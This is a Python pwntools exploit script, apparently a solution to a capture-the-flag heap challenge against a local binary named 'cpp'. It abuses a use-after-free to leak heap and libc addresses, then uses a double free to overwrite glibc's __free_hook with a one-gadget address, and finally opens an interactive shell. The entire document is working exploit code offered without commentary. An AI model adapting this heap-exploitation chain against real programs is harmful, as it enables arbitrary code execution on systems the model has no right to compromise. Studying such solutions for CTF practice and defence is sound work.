from pwn import *

def add(name,buf):
	r.sendlineafter(':','1')
	r.sendlineafter(':',name)
	r.sendlineafter(':',buf)

def remove(idx):
	r.sendlineafter(':','2')
	r.sendlineafter('idx:',str(idx))

def view(idx):
	r.sendlineafter(':','3')
	r.sendlineafter('idx:',str(idx))

r=process('./cpp')
e=ELF('./cpp')
libc=e.libc

#doesn't delete heap pointer

add('X'*0x1080,'X'*0x200)#0
add('A'*0x90,'B'*0x90)#1
add('C'*0x90,'F'*0x70+p64(0)+p64(0xa1)+p64(0)*2)#2

remove(1)

view(1)
Heap=u64(r.recvuntil('\n').replace('\x20','').replace('\x0a','').ljust(8,'\x00'))-81008

log.info('[HEAP] : '+str(hex(Heap)))

libc_target = Heap+81008+288
libc_target2 = Heap+81008+5840

log.info('Heap Target : '+str(hex(libc_target)))
log.info('Heap Target2 : '+str(hex(libc_target2)))
pay=p64(0)*2+p64(0xa1)+p64(0x100)+p64(libc_target2)*2+p64(0x100)
pay=pay.ljust(0x90,'\x00')
remove(1)
add(pay,p64(libc_target)*(0x90/8))

view(0)

libc_leak=u64(r.recvuntil('\x7f').replace('\x20','').ljust(8,'\x00'))-(libc.symbols['__malloc_hook']+0x10+96)

log.info(hex(libc_leak))

add('A','B')#2
add('C','D')#3

remove(2)
remove(2)
oneshot=libc_leak+0x10a38c
add(p64(0),p64(libc_leak+libc.symbols['__free_hook']))
add(p64(0),p64(oneshot)+p64(0))

#gdb.attach(r)
r.interactive()